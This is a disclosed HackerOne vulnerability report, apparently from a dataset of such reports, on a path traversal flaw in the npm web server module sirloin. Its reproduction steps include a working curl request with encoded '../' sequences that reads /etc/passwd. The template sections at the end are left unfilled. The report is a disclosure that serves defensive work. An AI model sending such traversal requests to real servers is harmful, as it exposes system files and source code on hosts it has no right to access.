---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '790623'
original_report_id: '790623'
title: '[sirloin] Web Server Directory Traversal via Crafted GET Request'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2020-02-07T16:34:25.707Z'
disclosed_at: '2020-08-30T15:54:30.384Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [sirloin] Web Server Directory Traversal via Crafted GET Request

## Metadata

- HackerOne Report ID: 790623
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-30T15:54:30.384Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report path traversal in Sirloin module.
It allows an attacker to read system files via path traversal local/remote

# Module

**module name:** Sirloin
**version:** 0.15.0 (latest release build)
**npm page:** `https://www.npmjs.com/package/sirloin`

## Module Description

This high performance, extremely easy to use web server.

## Module Stats

downloads in the last year 4,129

# Vulnerability

## Vulnerability Description

Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

1 npm install sirloin
2 start the local server by typing `nodejs node_modules/sirloin/bin/sirloin.js`
3 `curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"`

it will list the content of /etc/passwd

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

An attacker can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.
The package by default listen to 0.0.0.0 enabling external access.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
